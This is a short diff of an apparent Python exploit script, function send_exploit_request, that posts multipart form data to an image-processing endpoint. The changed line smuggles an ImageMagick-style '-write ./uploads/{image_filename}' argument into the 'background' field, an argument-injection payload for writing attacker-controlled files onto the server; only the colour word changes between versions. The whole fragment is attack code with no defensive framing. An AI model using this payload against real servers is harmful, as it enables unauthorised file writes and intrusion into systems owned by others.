@@ -54,7 +54,7 @@ def send_exploit_request(url, image_filename, image_filepath):
         ('rotate', (None, '90')),
         ('parentId', (None, '11')),
         ('format', (None, 'png')),
-        ('background', (None, f'blue -write ./uploads/{image_filename}')),
+        ('background', (None, f'green -write ./uploads/{image_filename}')),
         #('srcPath', (None, f'http://localhost/{image_filename}')),
         ('flip', (None, 'true')),
         ('image', (f"{image_filename}", open(image_filepath, 'rb'), 'image/png')),
